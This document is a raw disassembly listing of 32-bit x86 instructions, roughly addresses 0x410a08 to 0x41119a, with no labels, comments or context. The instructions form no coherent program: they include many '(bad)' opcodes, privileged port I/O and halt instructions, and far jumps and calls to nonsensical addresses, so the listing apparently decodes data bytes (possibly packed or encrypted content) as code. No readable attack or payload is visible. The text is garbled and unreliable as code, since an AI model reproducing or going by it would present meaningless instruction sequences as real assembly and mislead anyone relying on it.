  410a08:	rol    DWORD PTR [esi+0x2302497d],0x2b
  410a0f:	inc    ebp
  410a10:	or     BYTE PTR [ebp+0x6c3bb184],bh
  410a16:	scas   al,BYTE PTR es:[edi]
  410a17:	mov    ah,0xd9
  410a19:	add    ch,bh
  410a1b:	(bad)  
  410a1c:	clc    
  410a1d:	fs cmc 
  410a1f:	sub    esi,esi
  410a21:	xor    al,0x42
  410a23:	aad    0xd3
  410a25:	xchg   esp,eax
  410a26:	(bad)  
  410a27:	jbe    0x410a70
  410a29:	hlt    
  410a2a:	and    DWORD PTR es:[ebp+eiz*2-0x2a4790b8],0x97691542
  410a36:	(bad)  
  410a37:	cli    
  410a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a39:	push   0x6a2da49f
  410a3e:	test   al,0xfa
  410a40:	addr16 xchg edx,eax
  410a42:	stos   DWORD PTR es:[edi],eax
  410a43:	pusha  
  410a44:	(bad)  
  410a45:	in     al,dx
  410a46:	sti    
  410a47:	jo     0x410a46
  410a49:	or     al,0x16
  410a4b:	inc    eax
  410a4c:	xchg   DWORD PTR [ebx],eax
  410a4e:	iret   
  410a4f:	aad    0x2f
  410a51:	lods   eax,DWORD PTR ds:[esi]
  410a52:	xlat   BYTE PTR ds:[ebx]
  410a53:	lock jecxz 0x410a46
  410a56:	test   al,0x8f
  410a58:	sahf   
  410a59:	cmc    
  410a5a:	mov    dh,bh
  410a5c:	test   eax,0x403610a6
  410a61:	adc    ch,BYTE PTR [edx]
  410a63:	adc    eax,0x4a8b8586
  410a68:	enter  0x2eb5,0x7f
  410a6c:	cmp    BYTE PTR [ecx+0x3f],dl
  410a6f:	in     eax,0x78
  410a71:	addr16 pop ebx
  410a73:	stos   BYTE PTR es:[edi],al
  410a74:	fs push eax
  410a76:	jecxz  0x410a55
  410a78:	xor    al,0x93
  410a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a7b:	repz (bad) 
  410a7d:	jbe    0x410a39
  410a7f:	lods   eax,DWORD PTR es:[esi]
  410a81:	loop   0x410af0
  410a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a84:	out    dx,eax
  410a85:	int3   
  410a86:	dec    edx
  410a87:	xor    edi,DWORD PTR [edi+0x5902c2c7]
  410a8d:	dec    esp
  410a8e:	sbb    DWORD PTR [edi+0x658a0bc1],0xffffffca
  410a95:	jle    0x410a17
  410a97:	and    dh,BYTE PTR [esi+0x10]
  410a9a:	into   
  410a9b:	test   DWORD PTR [ebx],edx
  410a9d:	and    BYTE PTR [edi],ch
  410a9f:	and    BYTE PTR [edi+ebp*8-0x42],bh
  410aa3:	shl    ebx,0x10
  410aa6:	jmp    DWORD PTR [edx]
  410aa8:	iret   
  410aa9:	mov    eax,ds:0xb34e998
  410aae:	loop   0x410a3f
  410ab0:	inc    esi
  410ab1:	jp     0x410a81
  410ab3:	add    ebp,DWORD PTR [ebp+0x15afc8fb]
  410ab9:	adc    ebx,eax
  410abb:	cld    
  410abc:	mov    BYTE PTR [ebx],dh
  410abe:	fist   WORD PTR [esi+eiz*8-0x11]
  410ac2:	shl    DWORD PTR [ecx+0xf],cl
  410ac5:	push   es
  410ac6:	in     eax,0x5c
  410ac8:	icebp  
  410ac9:	stos   BYTE PTR es:[edi],al
  410aca:	scas   al,BYTE PTR es:[edi]
  410acb:	test   BYTE PTR [edx],cl
  410acd:	in     al,0x7e
  410acf:	add    BYTE PTR [eax-0x134ef992],dh
  410ad5:	leave  
  410ad6:	inc    edi
  410ad7:	stos   DWORD PTR es:[edi],eax
  410ad8:	clc    
  410ad9:	sbb    eax,0x7ef1f5a6
  410ade:	(bad)  
  410adf:	out    0xad,al
  410ae1:	arpl   WORD PTR [ecx+eax*4],cx
  410ae4:	(bad)  
  410ae5:	dec    esp
  410ae6:	sti    
  410ae7:	inc    edi
  410ae8:	out    0xaa,al
  410aea:	mov    dh,0xe6
  410aec:	loop   0x410aff
  410aee:	out    0xda,al
  410af0:	xchg   BYTE PTR [esi+0x4580d291],cl
  410af6:	aaa    
  410af7:	test   BYTE PTR [edi],dh
  410af9:	test   esi,edi
  410afb:	push   ds
  410afc:	stc    
  410afd:	and    al,0xbd
  410aff:	inc    ecx
  410b00:	repnz mov ds:0xc975ebec,eax
  410b06:	repz inc edx
  410b08:	stos   BYTE PTR es:[edi],al
  410b09:	gs add esp,edi
  410b0c:	ds mov ebx,0xac380d0e
  410b12:	cs mov ebx,0xd92fc185
  410b18:	mov    ss,WORD PTR [eax]
  410b1a:	fldenv [edi+ebx*4-0x6a957b49]
  410b21:	mov    ds:0xd18af3a,eax
  410b26:	jne    0x410b30
  410b28:	inc    ebp
  410b29:	add    al,0xbe
  410b2b:	mov    al,ds:0x70792d6c
  410b30:	in     al,dx
  410b31:	rcr    DWORD PTR [ebx+eax*4-0x26],0xa2
  410b36:	push   edi
  410b37:	orps   xmm4,XMMWORD PTR [esi+edi*4]
  410b3b:	mov    ecx,DWORD PTR [eax]
  410b3d:	and    DWORD PTR [ecx-0x7e609abe],ebx
  410b43:	cmp    al,0xe0
  410b45:	rcl    ebx,0xfe
  410b48:	sub    eax,0x5e9f47a5
  410b4d:	retf   
  410b4e:	xchg   edi,eax
  410b4f:	out    0x6e,eax
  410b51:	and    eax,0x533a5943
  410b56:	(bad)  
  410b57:	out    dx,al
  410b58:	stos   DWORD PTR es:[edi],eax
  410b59:	mov    DWORD PTR [edx+ebp*2+0x486b62c5],eax
  410b60:	enter  0x8742,0x3b
  410b64:	sbb    ch,al
  410b66:	jbe    0x410ba8
  410b68:	mov    ch,ah
  410b6a:	add    BYTE PTR [eax+eiz*8],dh
  410b6d:	jl     0x410bc6
  410b6f:	push   edi
  410b70:	in     al,0x3d
  410b72:	sbb    eax,0x26ebc787
  410b77:	pop    ebp
  410b78:	inc    ebx
  410b79:	sub    esi,esi
  410b7b:	mov    fs,WORD PTR [ebp-0x133886e7]
  410b81:	shr    DWORD PTR [edi+eax*2+0x2d],0xcb
  410b86:	jns    0xba951ac1
  410b8c:	xchg   edx,eax
  410b8d:	outs   dx,BYTE PTR ds:[esi]
  410b8e:	cmp    eax,0x52d83e0c
  410b93:	cmp    DWORD PTR [ebp+ecx*8-0x3f3a861b],esi
  410b9a:	jno    0x410c1a
  410b9c:	mov    ds:0x42d76e15,eax
  410ba1:	lods   eax,DWORD PTR ds:[esi]
  410ba2:	pop    esi
  410ba3:	cmpxchg edx,ecx
  410ba6:	adc    al,0x2d
  410ba8:	add    ecx,DWORD PTR [ebp+0x4f]
  410bab:	jl     0x410c1b
  410bad:	add    dl,bh
  410baf:	pop    esi
  410bb0:	iret   
  410bb1:	fwait
  410bb2:	mov    ecx,esi
  410bb4:	shr    BYTE PTR [esi+0x4a],cl
  410bb7:	into   
  410bb8:	mov    al,ds:0x8a4453ad
  410bbd:	rcr    BYTE PTR [ebx-0x48],0xe6
  410bc1:	cmp    bl,BYTE PTR ds:0x71b30974
  410bc7:	add    BYTE PTR [eax],cl
  410bc9:	push   esp
  410bca:	es test al,0x3b
  410bcd:	pop    es
  410bce:	mov    ds:0xc5ab998,eax
  410bd3:	add    DWORD PTR [ebp+0x43],0x1042e6ab
  410bda:	jg     0x410bbc
  410bdc:	das    
  410bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bdf:	sbb    BYTE PTR [ecx],0x4d
  410be2:	push   edi
  410be3:	jg     0x410b8f
  410be5:	jne    0x684adc76
  410beb:	sub    al,0xa7
  410bed:	gs ret 
  410bef:	mov    BYTE PTR [ecx+edx*4],dh
  410bf2:	ffree  st(7)
  410bf4:	push   ecx
  410bf5:	cdq    
  410bf6:	std    
  410bf7:	mov    edx,0xe92263d3
  410bfc:	inc    esp
  410bfd:	jp     0x410c10
  410bff:	mov    ds:0x86d5afe4,eax
  410c04:	inc    edi
  410c05:	test   BYTE PTR [edx],0x67
  410c08:	push   cs
  410c09:	shl    DWORD PTR [edx],0x4a
  410c0c:	pop    esi
  410c0d:	xor    al,0x23
  410c0f:	adc    dh,cl
  410c11:	pop    edi
  410c12:	lahf   
  410c13:	dec    eax
  410c14:	mov    bh,0x72
  410c16:	pusha  
  410c17:	clc    
  410c18:	xchg   ecx,eax
  410c19:	inc    esi
  410c1a:	mov    ecx,0x6cbeae89
  410c1f:	xbegin 0xd682ff52
  410c25:	clc    
  410c26:	push   es
  410c27:	xrelease mov BYTE PTR [ecx],bh
  410c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c2b:	imul   edx,eax,0xfffffffd
  410c2e:	es stos BYTE PTR es:[edi],al
  410c30:	call   0x4b69f30a
  410c35:	jno    0x410bfa
  410c37:	adc    cl,BYTE PTR [ecx+0xdeb44cb]
  410c3d:	sti    
  410c3e:	xchg   ebp,eax
  410c3f:	mov    bh,ah
  410c41:	lea    ecx,ds:0x8bdaf601
  410c47:	mov    gs,WORD PTR [esi-0x5ab782a0]
  410c4d:	mov    edx,0xaf752ba7
  410c52:	xchg   ebp,eax
  410c53:	call   0xb1aef353
  410c58:	mov    esp,0x31d2ecf2
  410c5d:	jnp    0x410cd9
  410c5f:	jg     0x410c67
  410c61:	scas   al,BYTE PTR es:[edi]
  410c62:	and    eax,0x77fda4b0
  410c67:	ja     0x410cc7
  410c69:	rcr    DWORD PTR ds:0x167086cd,0x3e
  410c70:	push   ecx
  410c71:	adc    eax,eax
  410c73:	lods   al,BYTE PTR ds:[esi]
  410c74:	jmp    0x410c0c
  410c76:	adc    ecx,esp
  410c78:	adc    DWORD PTR [esi+0x2ec40c03],edx
  410c7e:	jmp    0xba6a2694
  410c83:	ficomp DWORD PTR [ebp+esi*2-0x52]
  410c87:	dec    esi
  410c88:	into   
  410c89:	add    al,0xbb
  410c8b:	jbe    0x410cea
  410c8d:	dec    edi
  410c8e:	std    
  410c8f:	sar    DWORD PTR [edx+0x738a4a8c],0x57
  410c96:	loop   0x410c80
  410c98:	cwde   
  410c99:	xor    ch,bh
  410c9b:	lock mov WORD PTR [esi+ebx*1-0x6e],gs
  410ca0:	popa   
  410ca1:	loope  0x410d13
  410ca3:	in     eax,0x69
  410ca5:	sub    DWORD PTR [edi],edi
  410ca7:	jl     0x410cd4
  410ca9:	push   ecx
  410caa:	xor    ah,bh
  410cac:	jns    0x410ce5
  410cae:	sub    ch,dh
  410cb0:	pusha  
  410cb1:	ror    BYTE PTR [ebx],1
  410cb3:	pushf  
  410cb4:	stos   DWORD PTR es:[edi],eax
  410cb5:	popf   
  410cb6:	push   ebp
  410cb7:	out    0x5,eax
  410cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cba:	cwde   
  410cbb:	ret    
  410cbc:	push   ss
  410cbd:	mov    WORD PTR [edi-0x62be7160],ds
  410cc3:	outs   dx,DWORD PTR ds:[esi]
  410cc4:	jns    0x410c62
  410cc6:	iret   
  410cc7:	das    
  410cc8:	ja     0x410c59
  410cca:	(bad)  
  410ccb:	xchg   edi,eax
  410ccc:	pushf  
  410ccd:	mov    ecx,0xe78a759b
  410cd2:	es cwde 
  410cd4:	idiv   BYTE PTR [ebp-0x1f]
  410cd7:	shl    DWORD PTR [ebp-0x652fb2bc],cl
  410cdd:	xor    eax,esp
  410cdf:	inc    esp
  410ce0:	push   DWORD PTR [esi+0x14]
  410ce3:	sub    edi,DWORD PTR [edx-0x6c8c4ab7]
  410ce9:	stos   BYTE PTR es:[edi],al
  410cea:	loopne 0x410c6d
  410cec:	push   edx
  410ced:	nop
  410cee:	pop    ds
  410cef:	imul   edx,DWORD PTR [ebx-0x62fd1b0f],0x3f
  410cf6:	aad    0xa2
  410cf8:	sbb    al,0xec
  410cfa:	test   esp,ebp
  410cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cfd:	xor    DWORD PTR [edi],0xffffffb2
  410d00:	into   
  410d01:	lods   al,BYTE PTR ds:[esi]
  410d02:	lahf   
  410d03:	nop
  410d04:	sahf   
  410d05:	add    ah,ah
  410d07:	push   esi
  410d08:	cmp    bh,BYTE PTR gs:0xf51e1aef
  410d0f:	pop    ebp
  410d10:	and    esi,DWORD PTR [eax+0x7]
  410d13:	push   edx
  410d14:	pop    edx
  410d15:	sub    DWORD PTR [ebp-0x5076c821],edi
  410d1b:	and    edx,ebp
  410d1d:	call   0x197815ed
  410d22:	jmp    0xde92:0xa03f2d3a
  410d29:	mov    cl,0xee
  410d2b:	bnd ret 0xcf9b
  410d2f:	xor    dl,al
  410d31:	fisttp QWORD PTR [edi-0x27]
  410d34:	scas   eax,DWORD PTR es:[edi]
  410d35:	jp     0x410d63
  410d37:	push   cs
  410d38:	push   eax
  410d39:	shl    BYTE PTR [edx-0x59bc6f1d],0x3f
  410d40:	pop    esp
  410d41:	mov    ebp,0xc0a4861c
  410d46:	add    al,0xde
  410d48:	pushf  
  410d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d4a:	mov    al,ds:0xa4a80dc8
  410d4f:	aas    
  410d50:	aad    0x27
  410d52:	cmp    BYTE PTR ds:[eax-0x52],cl
  410d56:	in     al,dx
  410d57:	xor    BYTE PTR [edi+0x4f94125],bl
  410d5d:	mov    eax,ds:0x39b56a52
  410d62:	ins    BYTE PTR es:[edi],dx
  410d63:	xchg   esi,eax
  410d64:	and    al,0x22
  410d66:	push   ebx
  410d67:	in     al,0x11
  410d69:	pop    esi
  410d6a:	lea    esp,gs:[ebx]
  410d6d:	pop    ecx
  410d6e:	sar    DWORD PTR ds:0x10ad0de4,cl
  410d74:	xchg   esp,eax
  410d75:	stos   BYTE PTR es:[edi],al
  410d76:	jno    0x410d99
  410d78:	das    
  410d79:	jne    0x410d1a
  410d7b:	inc    edi
  410d7c:	jnp    0x410d6d
  410d7e:	jmp    0x410d80
  410d80:	and    BYTE PTR [edi+0x18],ch
  410d83:	leave  
  410d84:	out    dx,al
  410d85:	pop    esp
  410d86:	test   al,0xf7
  410d88:	mov    WORD PTR [ebp+0x29cfe128],ds
  410d8e:	push   esp
  410d8f:	inc    eax
  410d90:	add    ebx,DWORD PTR [ebx-0x10e29b28]
  410d96:	imul   eax,esp,0x27371265
  410d9c:	xchg   DWORD PTR [eax+0x43701f75],ecx
  410da2:	leave  
  410da3:	add    eax,0xdaaaed81
  410da8:	dec    esi
  410da9:	nop
  410daa:	adc    ch,BYTE PTR ds:0xc64ebdf8
  410db0:	lods   al,BYTE PTR ds:[esi]
  410db1:	call   ebx
  410db3:	xchg   esi,eax
  410db4:	call   0x17e3:0x1429a80
  410dbb:	and    al,bl
  410dbd:	jae    0x410d76
  410dbf:	stos   BYTE PTR es:[edi],al
  410dc0:	aam    0x99
  410dc2:	mov    al,ds:0xd028c576
  410dc7:	leave  
  410dc8:	sar    esi,1
  410dca:	jge    0x410e3d
  410dcc:	rcl    DWORD PTR [edx+0x13586be9],cl
  410dd2:	mov    eax,ds:0xf1119208
  410dd7:	std    
  410dd8:	in     eax,0x9d
  410dda:	ret    0xc25d
  410ddd:	cmp    eax,0x52273e0b
  410de2:	jns    0x410e45
  410de4:	xor    eax,0xec598514
  410de9:	retf   
  410dea:	pop    ecx
  410deb:	mov    ds:0xaa9927e8,eax
  410df0:	outs   dx,DWORD PTR ds:[esi]
  410df1:	imul   eax,DWORD PTR ds:[edx+0x7c],0x67
  410df6:	enter  0x283b,0x96
  410dfa:	adc    esp,DWORD PTR [edx+0x3710432f]
  410e00:	gs mov ebp,0x10ce65a8
  410e06:	xrelease mov BYTE PTR [ebx],ch
  410e09:	or     eax,0x714e6173
  410e0e:	mov    ebx,0x600f6c29
  410e13:	cs in  eax,0xe
  410e16:	pop    edx
  410e17:	xor    bh,BYTE PTR [ebx-0x18d4a762]
  410e1d:	jle    0x410dd5
  410e1f:	repnz mov dl,0x92
  410e22:	outs   dx,BYTE PTR ds:[esi]
  410e23:	dec    ebx
  410e24:	imul   edx,DWORD PTR [ebx+edi*1+0x28e62295],0x37
  410e2c:	and    al,BYTE PTR [edx+esi*4-0x5d]
  410e30:	cdq    
  410e31:	adc    DWORD PTR [edx-0x25529f0],eax
  410e37:	pop    esp
  410e38:	and    edi,DWORD PTR [ebp-0x5d]
  410e3b:	shl    eax,0xac
  410e3e:	or     al,0x2d
  410e40:	xchg   edi,eax
  410e41:	dec    ecx
  410e42:	add    ch,BYTE PTR [eax]
  410e44:	stc    
  410e45:	lahf   
  410e46:	gs into 
  410e48:	pop    ecx
  410e49:	daa    
  410e4a:	int    0x84
  410e4c:	and    ah,cl
  410e4e:	jecxz  0x410e88
  410e50:	xchg   BYTE PTR [esi-0xf74e58a],bl
  410e56:	adc    eax,0xb9bc61d6
  410e5b:	push   eax
  410e5c:	xchg   ecx,eax
  410e5d:	les    edx,FWORD PTR [edi+0x38]
  410e60:	test   al,0x8c
  410e62:	sub    al,0x1d
  410e64:	dec    eax
  410e65:	jmp    0x410e3f
  410e67:	out    dx,al
  410e68:	(bad)  
  410e69:	out    0x85,al
  410e6b:	jmp    0xf314:0xe44e2b79
  410e72:	in     al,dx
  410e73:	sub    bh,BYTE PTR [ebx-0x11]
  410e76:	cwde   
  410e77:	or     eax,0xdff7a547
  410e7c:	(bad)  
  410e7d:	mov    al,0xe7
  410e7f:	leave  
  410e80:	outs   dx,BYTE PTR ds:[esi]
  410e81:	cmp    eax,0xc117f4fe
  410e86:	repz clc 
  410e88:	fiadd  WORD PTR [ecx]
  410e8a:	stos   DWORD PTR es:[edi],eax
  410e8b:	pop    eax
  410e8c:	leave  
  410e8d:	icebp  
  410e8e:	or     BYTE PTR [ecx-0x36],ah
  410e91:	sbb    dl,bh
  410e93:	shl    DWORD PTR [edx-0x30f65c66],0x5d
  410e9a:	cs addr16 xchg ebx,eax
  410e9d:	xchg   esp,eax
  410e9e:	hlt    
  410e9f:	mov    edx,0x4d394e85
  410ea4:	jb     0x410ee2
  410ea6:	xchg   esi,eax
  410ea7:	add    BYTE PTR [edi-0x16],al
  410eaa:	dec    ebx
  410eab:	sub    DWORD PTR [eax+edi*2],0x322f74b4
  410eb2:	fdivr  QWORD PTR [ebp+0x40c215f4]
  410eb8:	jg     0x410e80
  410eba:	pop    esi
  410ebb:	jnp    0x410ec8
  410ebd:	bound  ecx,QWORD PTR [ebx-0x4]
  410ec0:	lahf   
  410ec1:	mov    WORD PTR [edi-0x2991855],?
  410ec7:	jge    0x410e4d
  410ec9:	mov    DWORD PTR [edi],ebx
  410ecb:	pop    edi
  410ecc:	push   es
  410ecd:	push   esp
  410ece:	jge    0x410eab
  410ed0:	cmp    al,0x30
  410ed2:	lods   eax,DWORD PTR ds:[esi]
  410ed3:	fistp  DWORD PTR [edx+eiz*4]
  410ed6:	or     DWORD PTR [eax+0x1a395523],eax
  410edc:	mov    ds:0x656dc46f,eax
  410ee1:	iret   
  410ee2:	in     eax,0x98
  410ee4:	ss dec esp
  410ee6:	bound  ebp,QWORD PTR [eax-0x57]
  410ee9:	xor    BYTE PTR [ebp+0x282e08c5],dl
  410eef:	mov    dh,0x71
  410ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef2:	push   ebp
  410ef3:	fimul  DWORD PTR [edi-0x72ff4277]
  410ef9:	jns    0x410ef3
  410efb:	push   0xffffff93
  410efd:	xchg   edx,eax
  410efe:	xchg   edi,eax
  410eff:	mov    eax,0x9808f263
  410f04:	shl    BYTE PTR [edx-0xb],0xa3
  410f08:	(bad)  
  410f09:	cmp    DWORD PTR [ebp-0x49dbdb31],ebx
  410f0f:	popf   
  410f10:	loopne 0x410f46
  410f12:	dec    eax
  410f13:	inc    ebx
  410f14:	(bad)  
  410f16:	push   eax
  410f17:	popa   
  410f18:	add    al,0xd9
  410f1a:	jp     0x410e9f
  410f1c:	int3   
  410f1d:	inc    esi
  410f1e:	in     al,dx
  410f1f:	addr16 js 0x410ed2
  410f22:	and    dl,ah
  410f24:	xchg   esp,eax
  410f25:	pop    esi
  410f26:	js     0xf15a6634
  410f2c:	into   
  410f2d:	ret    0xff55
  410f30:	icebp  
  410f31:	push   ebp
  410f32:	inc    eax
  410f33:	stos   DWORD PTR es:[edi],eax
  410f34:	xlat   BYTE PTR ds:[ebx]
  410f35:	jle    0x410ee0
  410f37:	lods   al,BYTE PTR ds:[esi]
  410f38:	xor    ebx,DWORD PTR [edx-0x37]
  410f3b:	aaa    
  410f3c:	sbb    cl,BYTE PTR [ecx+0x4b]
  410f3f:	sbb    al,0xf
  410f41:	or     DWORD PTR [esi+0x49a575b0],ecx
  410f47:	pop    ebx
  410f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f49:	cdq    
  410f4a:	add    eax,0x66324a7
  410f4f:	cmp    eax,0x49668fde
  410f54:	or     al,0x29
  410f56:	out    dx,al
  410f57:	push   ds
  410f58:	lods   eax,DWORD PTR ds:[esi]
  410f59:	call   0x4b5c6b5f
  410f5e:	int    0x60
  410f60:	lea    ebp,ds:0x872cddc0
  410f66:	cdq    
  410f67:	ja     0x410fb3
  410f69:	dec    ebp
  410f6a:	rol    BYTE PTR [ebp-0x5b407a40],cl
  410f70:	dec    esi
  410f71:	inc    ecx
  410f72:	cmp    cl,BYTE PTR [edi]
  410f74:	(bad)  
  410f75:	mov    dh,0x60
  410f77:	pusha  
  410f78:	fist   WORD PTR [ebx-0x4b71c0]
  410f7e:	or     al,0xd7
  410f80:	xlat   BYTE PTR ds:[ebx]
  410f81:	mov    ah,dh
  410f83:	enter  0x9ae8,0x7c
  410f87:	outs   dx,BYTE PTR ds:[esi]
  410f88:	popf   
  410f89:	jns    0x410f7a
  410f8b:	xchg   esi,eax
  410f8c:	jb     0x410f86
  410f8e:	pop    esp
  410f8f:	arpl   dx,si
  410f91:	es retf 0xc45
  410f95:	inc    ebp
  410f96:	std    
  410f97:	outs   dx,DWORD PTR ds:[esi]
  410f98:	jg     0x411019
  410f9a:	mov    cl,0xd0
  410f9c:	jl     0x410f35
  410f9e:	mov    cl,0xe5
  410fa0:	or     ecx,edx
  410fa2:	xlat   BYTE PTR ds:[ebx]
  410fa3:	not    BYTE PTR [ebx+0x3c]
  410fa6:	and    eax,0xd2175c3d
  410fab:	scas   al,BYTE PTR es:[edi]
  410fac:	or     BYTE PTR [ecx+esi*4+0x5b],ah
  410fb0:	xchg   ecx,eax
  410fb1:	xor    edi,DWORD PTR [eax+ebp*2-0x786b7e49]
  410fb8:	out    0x27,al
  410fba:	pop    ds
  410fbb:	sahf   
  410fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fbd:	push   esp
  410fbe:	and    eax,0x8979902a
  410fc3:	push   ds
  410fc4:	icebp  
  410fc5:	call   0xa9e2f323
  410fca:	mov    bh,0x1f
  410fcc:	jl     0x41103d
  410fce:	add    bh,BYTE PTR [edx]
  410fd0:	dec    ecx
  410fd1:	call   0xc99ec99c
  410fd6:	inc    edx
  410fd7:	fcom   DWORD PTR [esi]
  410fd9:	jecxz  0x410f76
  410fdb:	mov    eax,ds:0x106d82f0
  410fe0:	adc    edx,DWORD PTR [ebx]
  410fe2:	mov    al,ds:0x42cb3804
  410fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fe8:	cwde   
  410fe9:	jp     0x410fb2
  410feb:	push   edi
  410fec:	push   edi
  410fed:	rcl    DWORD PTR [edx+0x17ff5ae],0x6e
  410ff4:	mov    ch,0x7d
  410ff6:	das    
  410ff7:	lods   al,BYTE PTR ds:[esi]
  410ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ff9:	add    al,0x38
  410ffb:	mov    ecx,0x48ca484d
  411000:	jl     0x41101b
  411002:	popf   
  411003:	push   edx
  411004:	addr16 pop es
  411006:	(bad)  
  411007:	je     0x41104f
  411009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41100a:	or     DWORD PTR [edx],edi
  41100c:	jb     0x41102d
  41100e:	sbb    BYTE PTR ds:0x5057d27f,ch
  411014:	or     eax,DWORD PTR [ebx+edi*4]
  411017:	mov    edi,0xe4a4822b
  41101c:	rcr    DWORD PTR [edi-0x6a3a82e0],1
  411022:	adc    ebx,DWORD PTR [ecx-0xfe4dc33]
  411028:	out    dx,eax
  411029:	xchg   esi,eax
  41102a:	add    dl,BYTE PTR [ecx]
  41102c:	ret    0xb429
  41102f:	mov    WORD PTR ds:0xb8b63718,?
  411035:	scas   al,BYTE PTR es:[edi]
  411036:	mov    al,ds:0xcf87e53e
  41103b:	fstp   QWORD PTR [ebx]
  41103d:	shl    DWORD PTR [ecx],1
  41103f:	pop    eax
  411040:	add    dh,BYTE PTR [eax-0x5a]
  411043:	inc    edx
  411044:	mov    ah,0x44
  411046:	addr16 or eax,0x99b525cb
  41104c:	sbb    BYTE PTR [edx-0x77],0x96
  411050:	cmp    DWORD PTR [eax+edi*2+0x7b],0xffffffc2
  411055:	aaa    
  411056:	rcl    DWORD PTR [ecx-0x44],0x63
  41105a:	mov    dl,0xae
  41105c:	or     eax,0x1ec61e4f
  411061:	or     eax,DWORD PTR [ebx]
  411063:	xor    bl,cl
  411065:	imul   BYTE PTR [edi+0x17]
  411068:	jl     0x411086
  41106a:	mov    dh,0xa3
  41106c:	inc    eax
  41106d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41106e:	cmp    DWORD PTR [ebp-0x3644e17d],ebp
  411074:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  411076:	mov    ah,0xf7
  411078:	sub    dl,BYTE PTR [esi+0x1e]
  41107b:	add    dl,BYTE PTR [esi+ebp*2+0x7351d4af]
  411082:	jecxz  0x4110df
  411084:	xlat   BYTE PTR ds:[ebx]
  411085:	ret    
  411086:	add    DWORD PTR [esi+eiz*1],edx
  411089:	pop    eax
  41108a:	jmp    DWORD PTR [edx]
  41108c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41108d:	xchg   ebp,eax
  41108e:	xchg   BYTE PTR [ecx+esi*2-0xd],ah
  411092:	inc    edi
  411093:	shl    DWORD PTR [edx+0x4fdf65f5],1
  411099:	pop    eax
  41109a:	ret    0xa4b7
  41109d:	mov    fs,esp
  41109f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110a0:	or     BYTE PTR [esp+ebx*2-0x6821eb83],0x8f
  4110a8:	pop    ebp
  4110a9:	dec    edi
  4110aa:	js     0x4110ac
  4110ac:	sti    
  4110ad:	stos   BYTE PTR es:[edi],al
  4110ae:	or     DWORD PTR [ebx],0xf4e36e3e
  4110b4:	dec    esp
  4110b5:	lar    esp,WORD PTR [edx+0x53]
  4110b9:	push   0x1c
  4110bb:	repz cmc 
  4110bd:	and    DWORD PTR [ebx],0xffffffe4
  4110c0:	sbb    ah,dl
  4110c2:	pop    edi
  4110c3:	lods   al,BYTE PTR ds:[esi]
  4110c4:	or     BYTE PTR [ebp+0x6d3a2bb8],dl
  4110ca:	jnp    0x41111f
  4110cc:	push   es
  4110cd:	call   0xed60:0x64591dd3
  4110d4:	out    dx,al
  4110d5:	jo     0x41114a
  4110d7:	jle    0x411074
  4110d9:	push   ss
  4110da:	cmp    eax,0x1e493ea1
  4110df:	stos   BYTE PTR es:[edi],al
  4110e0:	cdq    
  4110e1:	test   BYTE PTR [bp+di],0x4c
  4110e5:	fdivr  QWORD PTR [ebx-0x69]
  4110e8:	push   ecx
  4110e9:	adc    al,BYTE PTR [ecx+eax*4+0x73]
  4110ed:	nop
  4110ee:	sbb    ecx,esp
  4110f0:	lea    esp,[eax]
  4110f2:	add    esp,ecx
  4110f4:	mov    BYTE PTR [edx-0x3196a951],dl
  4110fa:	fcomp  QWORD PTR [ebx+0x35]
  4110fd:	aad    0xdf
  4110ff:	xor    eax,0x81525925
  411104:	adc    cl,BYTE PTR [esi]
  411106:	mov    ecx,0xf5f9fc57
  41110b:	inc    eax
  41110c:	jne    0x411154
  41110e:	mov    dh,0x76
  411110:	push   es
  411111:	mov    edx,0xfba8531d
  411116:	pop    ds
  411117:	mov    ecx,0xfd061145
  41111c:	(bad)  
  41111f:	stos   DWORD PTR es:[edi],eax
  411120:	or     bl,bl
  411122:	(bad)  
  411123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411124:	in     eax,0xdb
  411126:	jle    0x411156
  411128:	xor    BYTE PTR [edi-0x1a5f7513],ch
  41112e:	aaa    
  41112f:	mov    esi,0xdd3dc52a
  411134:	in     al,0xbd
  411136:	mov    ah,0x4a
  411138:	sar    BYTE PTR [ebp-0x6a],0xd8
  41113c:	mov    ecx,0xe454217c
  411141:	jo     0x411150
  411143:	jns    0x41118c
  411145:	sub    ebp,DWORD PTR [edx-0x69]
  411148:	mov    ch,0xea
  41114a:	jp     0x4110fd
  41114c:	mov    ecx,0xe933163e
  411151:	add    DWORD PTR [edi+0x6844a078],edx
  411157:	stos   BYTE PTR es:[edi],al
  411158:	mov    eax,0x6d33be02
  41115d:	cwde   
  41115e:	sbb    eax,0x5476adde
  411163:	(bad)  
  411165:	js     0x4111c8
  411167:	test   esi,0x3e821461
  41116d:	fwait
  41116e:	call   0x82f5:0x68909d48
  411175:	addr16 in al,dx
  411177:	jns    0x411101
  411179:	xor    al,0xac
  41117b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41117d:	neg    ebp
  41117f:	jg     0x4111f5
  411181:	add    eax,0x6510b4c
  411186:	cmc    
  411187:	pop    ebp
  411188:	in     al,dx
  411189:	fwait
  41118a:	pusha  
  41118b:	repz cmp DWORD PTR [ebx],0x7e8e0cb4
  411192:	cmc    
  411193:	jbe    0x411195
  411195:	cmp    al,0x58
  411197:	gs jno 0x4111fe
  41119a:	mov    eax,0xd71d2bed
